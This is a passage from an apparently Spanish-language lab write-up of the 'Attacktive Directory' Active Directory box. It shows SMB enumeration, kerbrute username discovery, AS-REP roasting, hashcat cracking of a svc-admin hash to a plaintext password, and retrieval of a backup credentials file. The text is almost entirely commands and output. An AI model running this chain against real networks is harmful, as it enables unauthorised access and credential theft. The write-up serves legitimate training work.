<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Host<span class="w"> </span>is<span class="w"> </span>part<span class="w"> </span>of<span class="w"> </span>a<span class="w"> </span>domain<span class="w"> </span><span class="o">(</span>not<span class="w"> </span>a<span class="w"> </span>workgroup<span class="o">)</span>


<span class="w"> </span><span class="o">==================================(</span><span class="w"> </span>OS<span class="w"> </span>information<span class="w"> </span>on<span class="w"> </span><span class="m">10</span>.201.117.151<span class="w"> </span><span class="o">)==================================</span>


<span class="o">[</span>E<span class="o">]</span><span class="w"> </span>Can<span class="w"> </span>t<span class="w"> </span>get<span class="w"> </span>OS<span class="w"> </span>info<span class="w"> </span>with<span class="w"> </span>smbclient


<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Got<span class="w"> </span>OS<span class="w"> </span>info<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m">10</span>.201.117.151<span class="w"> </span>from<span class="w"> </span>srvinfo:<span class="w"> </span>
do_cmd:<span class="w"> </span>Could<span class="w"> </span>not<span class="w"> </span>initialise<span class="w"> </span>srvsvc.<span class="w"> </span>Error<span class="w"> </span>was<span class="w"> </span><span class="nv">NT_STATUS_ACCESS_DENIED</span>


<span class="w"> </span><span class="o">======================================(</span><span class="w"> </span>Users<span class="w"> </span>on<span class="w"> </span><span class="m">10</span>.201.117.151<span class="w"> </span><span class="o">)======================================</span>


<span class="o">[</span>E<span class="o">]</span><span class="w"> </span>Couldn<span class="w"> </span>t<span class="w"> </span>find<span class="w"> </span>users<span class="w"> </span>using<span class="w"> </span>querydispinfo:<span class="w"> </span>NT_STATUS_ACCESS_DENIED



<span class="o">[</span>E<span class="o">]</span><span class="w"> </span>Couldn<span class="w"> </span>t<span class="w"> </span>find<span class="w"> </span>users<span class="w"> </span>using<span class="w"> </span>enumdomusers:<span class="w"> </span><span class="nv">NT_STATUS_ACCESS_DENIED</span>


<span class="w"> </span><span class="o">================================(</span><span class="w"> </span>Share<span class="w"> </span>Enumeration<span class="w"> </span>on<span class="w"> </span><span class="m">10</span>.201.117.151<span class="w"> </span><span class="o">)================================</span>

do_connect:<span class="w"> </span>Connection<span class="w"> </span>to<span class="w"> </span><span class="m">10</span>.201.117.151<span class="w"> </span>failed<span class="w"> </span><span class="o">(</span>Error<span class="w"> </span>NT_STATUS_RESOURCE_NAME_NOT_FOUND<span class="o">)</span>

<span class="w">    </span>Sharename<span class="w">       </span>Type<span class="w">      </span>Comment
<span class="w">    </span>---------<span class="w">       </span>----<span class="w">      </span>-------
Reconnecting<span class="w"> </span>with<span class="w"> </span>SMB1<span class="w"> </span><span class="k">for</span><span class="w"> </span>workgroup<span class="w"> </span>listing.
Unable<span class="w"> </span>to<span class="w"> </span>connect<span class="w"> </span>with<span class="w"> </span>SMB1<span class="w"> </span>--<span class="w"> </span>no<span class="w"> </span>workgroup<span class="w"> </span>available

<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Attempting<span class="w"> </span>to<span class="w"> </span>map<span class="w"> </span>shares<span class="w"> </span>on<span class="w"> </span><span class="m">10</span>.201.117.151


<span class="w"> </span><span class="o">===========================(</span><span class="w"> </span>Password<span class="w"> </span>Policy<span class="w"> </span>Information<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m">10</span>.201.117.151<span class="w"> </span><span class="o">)===========================</span>


<span class="o">[</span>E<span class="o">]</span><span class="w"> </span>Unexpected<span class="w"> </span>error<span class="w"> </span>from<span class="w"> </span>polenum:



<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Attaching<span class="w"> </span>to<span class="w"> </span><span class="m">10</span>.201.117.151<span class="w"> </span>using<span class="w"> </span>a<span class="w"> </span>NULL<span class="w"> </span>share

<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Trying<span class="w"> </span>protocol<span class="w"> </span><span class="m">139</span>/SMB...

<span class="w">    </span><span class="o">[</span>!<span class="o">]</span><span class="w"> </span>Protocol<span class="w"> </span>failed:<span class="w"> </span>Cannot<span class="w"> </span>request<span class="w"> </span>session<span class="w"> </span><span class="o">(</span>Called<span class="w"> </span>Name:10.201.117.151<span class="o">)</span>

<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Trying<span class="w"> </span>protocol<span class="w"> </span><span class="m">445</span>/SMB...

<span class="w">    </span><span class="o">[</span>!<span class="o">]</span><span class="w"> </span>Protocol<span class="w"> </span>failed:<span class="w"> </span>SAMR<span class="w"> </span>SessionError:<span class="w"> </span>code:<span class="w"> </span>0xc0000022<span class="w"> </span>-<span class="w"> </span>STATUS_ACCESS_DENIED<span class="w"> </span>-<span class="w"> </span><span class="o">{</span>Access<span class="w"> </span>Denied<span class="o">}</span><span class="w"> </span>A<span class="w"> </span>process<span class="w"> </span>has<span class="w"> </span>requested<span class="w"> </span>access<span class="w"> </span>to<span class="w"> </span>an<span class="w"> </span>object<span class="w"> </span>but<span class="w"> </span>has<span class="w"> </span>not<span class="w"> </span>been<span class="w"> </span>granted<span class="w"> </span>those<span class="w"> </span>access<span class="w"> </span>rights.



<span class="o">[</span>E<span class="o">]</span><span class="w"> </span>Failed<span class="w"> </span>to<span class="w"> </span>get<span class="w"> </span>password<span class="w"> </span>policy<span class="w"> </span>with<span class="w"> </span><span class="nv">rpcclient</span>



<span class="w"> </span><span class="o">======================================(</span><span class="w"> </span>Groups<span class="w"> </span>on<span class="w"> </span><span class="m">10</span>.201.117.151<span class="w"> </span><span class="o">)======================================</span>


<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Getting<span class="w"> </span><span class="nb">builtin</span><span class="w"> </span>groups:


<span class="o">[</span>+<span class="o">]</span><span class="w">  </span>Getting<span class="w"> </span><span class="nb">builtin</span><span class="w"> </span>group<span class="w"> </span>memberships:


<span class="o">[</span>+<span class="o">]</span><span class="w">  </span>Getting<span class="w"> </span><span class="nb">local</span><span class="w"> </span>groups:


<span class="o">[</span>+<span class="o">]</span><span class="w">  </span>Getting<span class="w"> </span><span class="nb">local</span><span class="w"> </span>group<span class="w"> </span>memberships:


<span class="o">[</span>+<span class="o">]</span><span class="w">  </span>Getting<span class="w"> </span>domain<span class="w"> </span>groups:


<span class="o">[</span>+<span class="o">]</span><span class="w">  </span>Getting<span class="w"> </span>domain<span class="w"> </span>group<span class="w"> </span>memberships:


<span class="w"> </span><span class="o">=================(</span><span class="w"> </span>Users<span class="w"> </span>on<span class="w"> </span><span class="m">10</span>.201.117.151<span class="w"> </span>via<span class="w"> </span>RID<span class="w"> </span>cycling<span class="w"> </span><span class="o">(</span>RIDS:<span class="w"> </span><span class="m">500</span>-550,1000-1050<span class="o">)</span><span class="w"> </span><span class="o">)=================</span>


<span class="o">[</span>I<span class="o">]</span><span class="w"> </span>Found<span class="w"> </span>new<span class="w"> </span>SID:<span class="w"> </span>
S-1-5-21-3591857110-2884097990-301047963
</code></pre></div>
<p>No es posible ver recursos compartidos con smb</p>
<div class="highlight"><pre><span></span><code>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.201.117.151<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>--shares

nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.201.117.151<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;guest&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>--shares

nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.201.117.151<span class="w">  </span>--shares
</code></pre></div>
<h2 id="kerbrute">kerbrute<a class="headerlink" href="#kerbrute" title="Permanent link">&para;</a></h2>
<p>Descargarnos los recursos compartidos para usar kerbrute</p>
<div class="highlight"><pre><span></span><code>curl<span class="w"> </span>https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt<span class="w"> </span>&gt;<span class="w"> </span>users.txt<span class="w">    </span>

curl<span class="w"> </span>https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt<span class="w"> </span>&gt;<span class="w"> </span>passwords.txt
</code></pre></div>
<p>Uso de kerbrute con las lista de usuarios y contrase√±as</p>
<div class="highlight"><pre><span></span><code>kerbrute<span class="w"> </span>userenum<span class="w"> </span>-d<span class="w"> </span>spookysec.local<span class="w"> </span>--dc<span class="w"> </span><span class="m">10</span>.201.113.138<span class="w"> </span>users.txt

<span class="m">2025</span>/10/04<span class="w"> </span><span class="m">19</span>:08:59<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">  </span>james@spookysec.local
<span class="m">2025</span>/10/04<span class="w"> </span><span class="m">19</span>:09:05<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">  </span>svc-admin@spookysec.local
<span class="m">2025</span>/10/04<span class="w"> </span><span class="m">19</span>:09:11<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">  </span>James@spookysec.local
<span class="m">2025</span>/10/04<span class="w"> </span><span class="m">19</span>:09:14<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">  </span>robin@spookysec.local
<span class="m">2025</span>/10/04<span class="w"> </span><span class="m">19</span>:09:40<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">  </span>darkstar@spookysec.local
<span class="m">2025</span>/10/04<span class="w"> </span><span class="m">19</span>:09:57<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">  </span>administrator@spookysec.local
<span class="m">2025</span>/10/04<span class="w"> </span><span class="m">19</span>:10:31<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">  </span>backup@spookysec.local
<span class="m">2025</span>/10/04<span class="w"> </span><span class="m">19</span>:10:47<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">  </span>paradox@spookysec.local
</code></pre></div>
<div class="highlight"><pre><span></span><code>cat<span class="w"> </span>user_domain.txt<span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span><span class="s1">&#39;{print $7}&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sed<span class="w"> </span><span class="s1">&#39;s/@spookysec\.local//g&#39;</span><span class="w"> </span>&gt;<span class="w"> </span>users.txt
james
svc-admin
James
robin
darkstar
administrator
backup
paradox
</code></pre></div>
<h3 id="asreproasting">ASReproasting<a class="headerlink" href="#asreproasting" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code>impacket-GetNPUsers<span class="w"> </span>spookysec.local/<span class="w"> </span>-no-pass<span class="w"> </span>-usersfile<span class="w"> </span>user_domain.txt
Impacket<span class="w"> </span>v0.13.0.dev0<span class="w"> </span>-<span class="w"> </span>Copyright<span class="w"> </span>Fortra,<span class="w"> </span>LLC<span class="w"> </span>and<span class="w"> </span>its<span class="w"> </span>affiliated<span class="w"> </span>companies<span class="w"> </span>

<span class="o">[</span>-<span class="o">]</span><span class="w"> </span>User<span class="w"> </span>james<span class="w"> </span>doesn<span class="w"> </span>t<span class="w"> </span>have<span class="w"> </span>UF_DONT_REQUIRE_PREAUTH<span class="w"> </span><span class="nb">set</span>
<span class="nv">$krb5asrep$23$svc</span>-admin@SPOOKYSEC.LOCAL:f4829b0ad7df764f5b16a6d21398696e<span class="nv">$aed0d8374d5e49a34d9692908583abfc74df7530ab1716721e56756863400258e2ac4cc34f17f04ec0f2414439c168b85cd121008d71eec2723325835d2b6cf9621cafeb38547225e4881a37d611fe686b9a5c6cb01a8eb4b673b03c98988664bed187d664c99ef9a2df5dcd6e7a2206602819b329cf5bd0380267bfd960d475c080563845d78f311e7f35c74fc5ae84a2a3eeac711d084616de81696affadcebdadced2b2c92e7413d334034214c8e0dfa39863dc92ea1111663a14650e762a5dc237dbedab793e048d62193af32ff3515a2270a4abbefe09623db5033b1edbf5955c9a7d1d1fe1409c82ead0e4a9154a35</span>
<span class="o">[</span>-<span class="o">]</span><span class="w"> </span>User<span class="w"> </span>James<span class="w"> </span>doesn<span class="s1">&#39;t have UF_DONT_REQUIRE_PREAUTH set</span>
<span class="s1">[-] User robin doesn&#39;</span>t<span class="w"> </span>have<span class="w"> </span>UF_DONT_REQUIRE_PREAUTH<span class="w"> </span><span class="nb">set</span>
<span class="o">[</span>-<span class="o">]</span><span class="w"> </span>User<span class="w"> </span>darkstar<span class="w"> </span>doesn<span class="s1">&#39;t have UF_DONT_REQUIRE_PREAUTH set</span>
<span class="s1">[-] User administrator doesn&#39;</span>t<span class="w"> </span>have<span class="w"> </span>UF_DONT_REQUIRE_PREAUTH<span class="w"> </span><span class="nb">set</span>
<span class="o">[</span>-<span class="o">]</span><span class="w"> </span>User<span class="w"> </span>backup<span class="w"> </span>doesn<span class="s1">&#39;t have UF_DONT_REQUIRE_PREAUTH set</span>
<span class="s1">[-] User paradox doesn&#39;</span>t<span class="w"> </span>have<span class="w"> </span>UF_DONT_REQUIRE_PREAUTH<span class="w"> </span><span class="nb">set</span>
</code></pre></div>
<p>Guardamos el HASH
<div class="highlight"><pre><span></span><code>cat<span class="w"> </span>hash.txt
admin@SPOOKYSEC.LOCAL:f4829b0ad7df764f5b16a6d21398696e<span class="nv">$aed0d8374d5e49a34d9692908583abfc74df7530ab1716721e56756863400258e2ac4cc34f17f04ec0f2414439c168b85cd121008d71eec2723325835d2b6cf9621cafeb38547225e4881a37d611fe686b9a5c6cb01a8eb4b673b03c98988664bed187d664c99ef9a2df5dcd6e7a2206602819b329cf5bd0380267bfd960d475c080563845d78f311e7f35c74fc5ae84a2a3eeac711d084616de81696affadcebdadced2b2c92e7413d334034214c8e0dfa39863dc92ea1111663a14650e762a5dc237dbedab793e048d62193af32ff3515a2270a4abbefe09623db5033b1edbf5955c9a7d1d1fe1409c82ead0e4a9154a35</span>
</code></pre></div></p>
<p>Crack del Hash</p>
<div class="highlight"><pre><span></span><code><span class="w"> </span>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">18200</span><span class="w"> </span>--force<span class="w"> </span>-a<span class="w"> </span><span class="m">0</span><span class="w"> </span>hash.txt<span class="w"> </span>/usr/share/wordlists/rockyou.txt<span class="w">  </span>

<span class="nv">$krb5asrep$23$svc</span>-admin@SPOOKYSEC.LOCAL:f4829b0ad7df764f5b16a6d21398696e<span class="nv">$aed0d8374d5e49a34d9692908583abfc74df7530ab1716721e56756863400258e2ac4cc34f17f04ec0f2414439c168b85cd121008d71eec2723325835d2b6cf9621cafeb38547225e4881a37d611fe686b9a5c6cb01a8eb4b673b03c98988664bed187d664c99ef9a2df5dcd6e7a2206602819b329cf5bd0380267bfd960d475c080563845d78f311e7f35c74fc5ae84a2a3eeac711d084616de81696affadcebdadced2b2c92e7413d334034214c8e0dfa39863dc92ea1111663a14650e762a5dc237dbedab793e048d62193af32ff3515a2270a4abbefe09623db5033b1edbf5955c9a7d1d1fe1409c82ead0e4a9154a35</span>:management2005
</code></pre></div>
<table>
<thead>
<tr>
<th>User</th>
<th>Password</th>
</tr>
</thead>
<tbody>
<tr>
<td>svc-admin</td>
<td>management2005</td>
</tr>
</tbody>
</table>
<p>Ahora tenemos la opciones de enumerar directorios</p>
<div class="highlight"><pre><span></span><code>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.201.113.138<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;svc-admin&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;management2005&#39;</span><span class="w"> </span>--shares<span class="w"> </span>
SMB<span class="w">         </span><span class="m">10</span>.201.113.138<span class="w">  </span><span class="m">445</span><span class="w">    </span>ATTACKTIVEDIREC<span class="w">  </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">10</span><span class="w"> </span>/<span class="w"> </span>Server<span class="w"> </span><span class="m">2019</span><span class="w"> </span>Build<span class="w"> </span><span class="m">17763</span><span class="w"> </span>x64<span class="w"> </span><span class="o">(</span>name:ATTACKTIVEDIREC<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:spookysec.local<span class="o">)</span><span class="w"> </span><span class="o">(</span>signing:True<span class="o">)</span><span class="w"> </span><span class="o">(</span>SMBv1:False<span class="o">)</span><span class="w"> </span>
SMB<span class="w">         </span><span class="m">10</span>.201.113.138<span class="w">  </span><span class="m">445</span><span class="w">    </span>ATTACKTIVEDIREC<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>spookysec.local<span class="se">\s</span>vc-admin:management2005<span class="w"> </span>
SMB<span class="w">         </span><span class="m">10</span>.201.113.138<span class="w">  </span><span class="m">445</span><span class="w">    </span>ATTACKTIVEDIREC<span class="w">  </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Enumerated<span class="w"> </span>shares
SMB<span class="w">         </span><span class="m">10</span>.201.113.138<span class="w">  </span><span class="m">445</span><span class="w">    </span>ATTACKTIVEDIREC<span class="w">  </span>Share<span class="w">           </span>Permissions<span class="w">     </span>Remark
SMB<span class="w">         </span><span class="m">10</span>.201.113.138<span class="w">  </span><span class="m">445</span><span class="w">    </span>ATTACKTIVEDIREC<span class="w">  </span>-----<span class="w">           </span>-----------<span class="w">     </span>------
SMB<span class="w">         </span><span class="m">10</span>.201.113.138<span class="w">  </span><span class="m">445</span><span class="w">    </span>ATTACKTIVEDIREC<span class="w">  </span>ADMIN$<span class="w">                          </span>Remote<span class="w"> </span>Admin
SMB<span class="w">         </span><span class="m">10</span>.201.113.138<span class="w">  </span><span class="m">445</span><span class="w">    </span>ATTACKTIVEDIREC<span class="w">  </span>backup<span class="w">          </span>READ<span class="w">            </span>
SMB<span class="w">         </span><span class="m">10</span>.201.113.138<span class="w">  </span><span class="m">445</span><span class="w">    </span>ATTACKTIVEDIREC<span class="w">  </span>C$<span class="w">                              </span>Default<span class="w"> </span>share
SMB<span class="w">         </span><span class="m">10</span>.201.113.138<span class="w">  </span><span class="m">445</span><span class="w">    </span>ATTACKTIVEDIREC<span class="w">  </span>IPC$<span class="w">            </span>READ<span class="w">            </span>Remote<span class="w"> </span>IPC
SMB<span class="w">         </span><span class="m">10</span>.201.113.138<span class="w">  </span><span class="m">445</span><span class="w">    </span>ATTACKTIVEDIREC<span class="w">  </span>NETLOGON<span class="w">        </span>READ<span class="w">            </span>Logon<span class="w"> </span>server<span class="w"> </span>share<span class="w"> </span>
SMB<span class="w">         </span><span class="m">10</span>.201.113.138<span class="w">  </span><span class="m">445</span><span class="w">    </span>ATTACKTIVEDIREC<span class="w">  </span>SYSVOL<span class="w">          </span>READ<span class="w">            </span>Logon<span class="w"> </span>server<span class="w"> </span>share<span class="w"> </span>
</code></pre></div>
<p>Enumeraci√≥n de usuarios</p>
<div class="highlight"><pre><span></span><code>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.201.113.138<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;svc-admin&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;management2005&#39;</span><span class="w"> </span>--users<span class="w">  </span>
SMB<span class="w">         </span><span class="m">10</span>.201.113.138<span class="w">  </span><span class="m">445</span><span class="w">    </span>ATTACKTIVEDIREC<span class="w">  </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">10</span><span class="w"> </span>/<span class="w"> </span>Server<span class="w"> </span><span class="m">2019</span><span class="w"> </span>Build<span class="w"> </span><span class="m">17763</span><span class="w"> </span>x64<span class="w"> </span><span class="o">(</span>name:ATTACKTIVEDIREC<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:spookysec.local<span class="o">)</span><span class="w"> </span><span class="o">(</span>signing:True<span class="o">)</span><span class="w"> </span><span class="o">(</span>SMBv1:False<span class="o">)</span><span class="w"> </span>
SMB<span class="w">         </span><span class="m">10</span>.201.113.138<span class="w">  </span><span class="m">445</span><span class="w">    </span>ATTACKTIVEDIREC<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>spookysec.local<span class="se">\s</span>vc-admin:management2005<span class="w"> </span>
SMB<span class="w">         </span><span class="m">10</span>.201.113.138<span class="w">  </span><span class="m">445</span><span class="w">    </span>ATTACKTIVEDIREC<span class="w">  </span>-Username-<span class="w">                    </span>-Last<span class="w"> </span>PW<span class="w"> </span>Set-<span class="w">       </span>-BadPW-<span class="w"> </span>-Description-<span class="w">                                               </span>
SMB<span class="w">         </span><span class="m">10</span>.201.113.138<span class="w">  </span><span class="m">445</span><span class="w">    </span>ATTACKTIVEDIREC<span class="w">  </span>Administrator<span class="w">                 </span><span class="m">2020</span>-09-17<span class="w"> </span><span class="m">22</span>:53:28<span class="w"> </span><span class="m">0</span><span class="w">       </span>Built-in<span class="w"> </span>account<span class="w"> </span><span class="k">for</span><span class="w"> </span>administering<span class="w"> </span>the<span class="w"> </span>computer/domain<span class="w"> </span>
SMB<span class="w">         </span><span class="m">10</span>.201.113.138<span class="w">  </span><span class="m">445</span><span class="w">    </span>ATTACKTIVEDIREC<span class="w">  </span>Guest<span class="w">                         </span>&lt;never&gt;<span class="w">             </span><span class="m">0</span><span class="w">       </span>Built-in<span class="w"> </span>account<span class="w"> </span><span class="k">for</span><span class="w"> </span>guest<span class="w"> </span>access<span class="w"> </span>to<span class="w"> </span>the<span class="w"> </span>computer/domain<span class="w"> </span>
SMB<span class="w">         </span><span class="m">10</span>.201.113.138<span class="w">  </span><span class="m">445</span><span class="w">    </span>ATTACKTIVEDIREC<span class="w">  </span>krbtgt<span class="w">                        </span><span class="m">2020</span>-04-04<span class="w"> </span><span class="m">18</span>:40:08<span class="w"> </span><span class="m">0</span><span class="w">       </span>Key<span class="w"> </span>Distribution<span class="w"> </span>Center<span class="w"> </span>Service<span class="w"> </span>Account<span class="w"> </span>
SMB<span class="w">         </span><span class="m">10</span>.201.113.138<span class="w">  </span><span class="m">445</span><span class="w">    </span>ATTACKTIVEDIREC<span class="w">  </span>skidy<span class="w">                         </span><span class="m">2020</span>-04-04<span class="w"> </span><span class="m">18</span>:44:07<span class="w"> </span><span class="m">0</span><span class="w">        </span>
SMB<span class="w">         </span><span class="m">10</span>.201.113.138<span class="w">  </span><span class="m">445</span><span class="w">    </span>ATTACKTIVEDIREC<span class="w">  </span>breakerofthings<span class="w">               </span><span class="m">2020</span>-04-04<span class="w"> </span><span class="m">18</span>:51:31<span class="w"> </span><span class="m">0</span><span class="w">        </span>
SMB<span class="w">         </span><span class="m">10</span>.201.113.138<span class="w">  </span><span class="m">445</span><span class="w">    </span>ATTACKTIVEDIREC<span class="w">  </span>james<span class="w">                         </span><span class="m">2020</span>-04-04<span class="w"> </span><span class="m">18</span>:51:53<span class="w"> </span><span class="m">0</span><span class="w">        </span>
SMB<span class="w">         </span><span class="m">10</span>.201.113.138<span class="w">  </span><span class="m">445</span><span class="w">    </span>ATTACKTIVEDIREC<span class="w">  </span>optional<span class="w">                      </span><span class="m">2020</span>-04-04<span class="w"> </span><span class="m">18</span>:52:32<span class="w"> </span><span class="m">0</span><span class="w">        </span>
SMB<span class="w">         </span><span class="m">10</span>.201.113.138<span class="w">  </span><span class="m">445</span><span class="w">    </span>ATTACKTIVEDIREC<span class="w">  </span>sherlocksec<span class="w">                   </span><span class="m">2020</span>-04-04<span class="w"> </span><span class="m">18</span>:52:56<span class="w"> </span><span class="m">0</span><span class="w">        </span>
SMB<span class="w">         </span><span class="m">10</span>.201.113.138<span class="w">  </span><span class="m">445</span><span class="w">    </span>ATTACKTIVEDIREC<span class="w">  </span>darkstar<span class="w">                      </span><span class="m">2020</span>-04-04<span class="w"> </span><span class="m">18</span>:53:17<span class="w"> </span><span class="m">0</span><span class="w">        </span>
SMB<span class="w">         </span><span class="m">10</span>.201.113.138<span class="w">  </span><span class="m">445</span><span class="w">    </span>ATTACKTIVEDIREC<span class="w">  </span>Ori<span class="w">                           </span><span class="m">2020</span>-04-04<span class="w"> </span><span class="m">18</span>:53:46<span class="w"> </span><span class="m">0</span><span class="w">        </span>
SMB<span class="w">         </span><span class="m">10</span>.201.113.138<span class="w">  </span><span class="m">445</span><span class="w">    </span>ATTACKTIVEDIREC<span class="w">  </span>robin<span class="w">                         </span><span class="m">2020</span>-04-04<span class="w"> </span><span class="m">18</span>:54:08<span class="w"> </span><span class="m">0</span><span class="w">        </span>
SMB<span class="w">         </span><span class="m">10</span>.201.113.138<span class="w">  </span><span class="m">445</span><span class="w">    </span>ATTACKTIVEDIREC<span class="w">  </span>paradox<span class="w">                       </span><span class="m">2020</span>-04-04<span class="w"> </span><span class="m">18</span>:54:29<span class="w"> </span><span class="m">0</span><span class="w">        </span>
SMB<span class="w">         </span><span class="m">10</span>.201.113.138<span class="w">  </span><span class="m">445</span><span class="w">    </span>ATTACKTIVEDIREC<span class="w">  </span>Muirland<span class="w">                      </span><span class="m">2020</span>-04-04<span class="w"> </span><span class="m">18</span>:55:01<span class="w"> </span><span class="m">0</span><span class="w">        </span>
SMB<span class="w">         </span><span class="m">10</span>.201.113.138<span class="w">  </span><span class="m">445</span><span class="w">    </span>ATTACKTIVEDIREC<span class="w">  </span>horshark<span class="w">                      </span><span class="m">2020</span>-04-04<span class="w"> </span><span class="m">18</span>:55:29<span class="w"> </span><span class="m">0</span><span class="w">        </span>
SMB<span class="w">         </span><span class="m">10</span>.201.113.138<span class="w">  </span><span class="m">445</span><span class="w">    </span>ATTACKTIVEDIREC<span class="w">  </span>svc-admin<span class="w">                     </span><span class="m">2020</span>-04-04<span class="w"> </span><span class="m">18</span>:57:56<span class="w"> </span><span class="m">0</span><span class="w">        </span>
SMB<span class="w">         </span><span class="m">10</span>.201.113.138<span class="w">  </span><span class="m">445</span><span class="w">    </span>ATTACKTIVEDIREC<span class="w">  </span>backup<span class="w">                        </span><span class="m">2020</span>-04-04<span class="w"> </span><span class="m">19</span>:57:05<span class="w"> </span><span class="m">0</span><span class="w">        </span>
SMB<span class="w">         </span><span class="m">10</span>.201.113.138<span class="w">  </span><span class="m">445</span><span class="w">    </span>ATTACKTIVEDIREC<span class="w">  </span>a-spooks<span class="w">                      </span><span class="m">2020</span>-09-17<span class="w"> </span><span class="m">23</span>:02:20<span class="w"> </span><span class="m">0</span><span class="w">        </span>
SMB<span class="w">         </span><span class="m">10</span>.201.113.138<span class="w">  </span><span class="m">445</span><span class="w">    </span>ATTACKTIVEDIREC<span class="w">  </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Enumerated<span class="w"> </span><span class="m">17</span><span class="w"> </span><span class="nb">local</span><span class="w"> </span>users:<span class="w"> </span>THM-AD
</code></pre></div>
<p>Enumeraci√≥n con <code>smbclient</code>, hemos encontrado un contenido.</p>
<div class="highlight"><pre><span></span><code>smbclient<span class="w"> </span>-U<span class="w"> </span><span class="s1">&#39;svc-admin&#39;</span><span class="w"> </span>//10.201.113.138/backup
Password<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="o">[</span>WORKGROUP<span class="se">\s</span>vc-admin<span class="o">]</span>:
Try<span class="w"> </span><span class="s2">&quot;help&quot;</span><span class="w"> </span>to<span class="w"> </span>get<span class="w"> </span>a<span class="w"> </span>list<span class="w"> </span>of<span class="w"> </span>possible<span class="w"> </span>commands.
smb:<span class="w"> </span><span class="se">\&gt;</span><span class="w"> </span>dir
<span class="w">  </span>.<span class="w">                                   </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Sat<span class="w"> </span>Apr<span class="w">  </span><span class="m">4</span><span class="w"> </span><span class="m">16</span>:08:39<span class="w"> </span><span class="m">2020</span>
<span class="w">  </span>..<span class="w">                                  </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Sat<span class="w"> </span>Apr<span class="w">  </span><span class="m">4</span><span class="w"> </span><span class="m">16</span>:08:39<span class="w"> </span><span class="m">2020</span>
<span class="w">  </span>backup_credentials.txt<span class="w">              </span>A<span class="w">       </span><span class="m">48</span><span class="w">  </span>Sat<span class="w"> </span>Apr<span class="w">  </span><span class="m">4</span><span class="w"> </span><span class="m">16</span>:08:53<span class="w"> </span><span class="m">2020</span>

<span class="w">        </span><span class="m">8247551</span><span class="w"> </span>blocks<span class="w"> </span>of<span class="w"> </span>size<span class="w"> </span><span class="m">4096</span>.<span class="w"> </span><span class="m">3572768</span><span class="w"> </span>blocks<span class="w"> </span>available
smb:<span class="w"> </span><span class="se">\&gt;</span><span class="w"> </span>get<span class="w"> </span>backup_credentials.txt<span class="w"> </span>
getting<span class="w"> </span>file<span class="w"> </span><span class="se">\b</span>ackup_credentials.txt<span class="w"> </span>of<span class="w"> </span>size<span class="w"> </span><span class="m">48</span><span class="w"> </span>as<span class="w"> </span>backup_credentials.txt<span class="w"> </span><span class="o">(</span><span class="m">0</span>.0<span class="w"> </span>KiloBytes/sec<span class="o">)</span><span class="w"> </span><span class="o">(</span>average<span class="w"> </span><span class="m">0</span>.0<span class="w"> </span>KiloBytes/sec<span class="o">)</span>
smb:<span class="w"> </span><span class="se">\&gt;</span><span class="w"> </span><span class="nb">exit</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code>cat<span class="w"> </span>backup_credentials.txt<span class="w"> </span>
